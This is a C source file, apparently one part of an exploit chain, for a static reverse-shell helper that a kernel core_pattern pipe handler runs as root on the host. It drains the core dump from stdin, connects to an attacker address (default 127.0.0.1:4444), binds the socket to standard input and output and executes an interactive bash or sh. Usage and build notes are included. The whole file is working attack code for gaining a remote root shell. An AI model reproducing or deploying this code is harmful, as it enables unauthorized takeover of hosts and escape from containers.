/* revsh.c — minimal static reverse-shell helper.
 *
 * The core_pattern pipe handler runs INSIDE the kernel's usermodehelper
 * context, which executes a single file (the handler) with root on the
 * host. The handler can be a simple shell script, but making the script
 * itself dial home needs `nc` or bash's /dev/tcp — both are gone on many
 * modern distro images/hosts. So the handler just execs this static
 * helper instead: raw syscalls only, static build, zero deps.
 *
 * Behavior:
 *   1. drain stdin   — the kernel pipes the core dump into the handler's
 *      stdin; consume it or the crashing process blocks forever.
 *   2. connect       — dial back to ATTACKER_IP:PORT
 *   3. dup2          — wire the socket to fd 0/1/2
 *   4. exec sh       — interactive shell on the caller (host, since this
 *      runs via the handler in the init namespaces)
 *
 * Usage (from the core_pattern handler):
 *   .revsh <ATTACKER_IP> <PORT>
 *
 * Build: make
 */
#define _GNU_SOURCE
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#define BUFSZ 4096

static int drain_stdin(void)
{
	char buf[BUFSZ];
	ssize_t n;

	for (;;) {
		n = read(0, buf, sizeof(buf));
		if (n < 0 && errno == EINTR)
			continue;
		if (n <= 0)
			return 0;
	}
}

int main(int argc, char **argv)
{
	const char *ip   = (argc > 1) ? argv[1] : "127.0.0.1";
	unsigned short port = (argc > 2) ? (unsigned short)atoi(argv[2]) : 4444;
	int s;
	struct sockaddr_in addr;

	if (drain_stdin() != 0) {
		fprintf(stderr, "[-] drain(stdin): %s\n", strerror(errno));
		return 1;
	}

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0) {
		fprintf(stderr, "[-] socket(): %s\n", strerror(errno));
		return 1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port   = htons(port);
	if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
		fprintf(stderr, "[-] inet_pton(%s): %s\n", ip, strerror(errno));
		return 1;
	}

	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
		fprintf(stderr, "[-] connect(%s:%u): %s\n", ip, port, strerror(errno));
		return 1;
	}

	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	close(s);
	/* In the usermodehelper context, plain writes to fd 1 can fail with
	 * EIO/EBADF; route stdout over the stderr socket (which works) so the
	 * shell's output is not lost. */
	execl("/bin/bash", "bash", "-c", "exec 1>&2; exec bash -i", (char *)NULL);
	if (errno == ENOENT)
		execl("/bin/sh", "sh", "-c", "exec 1>&2; exec sh -i", (char *)NULL);

	fprintf(stderr, "[-] execl(): %s\n", strerror(errno));
	return 1;
}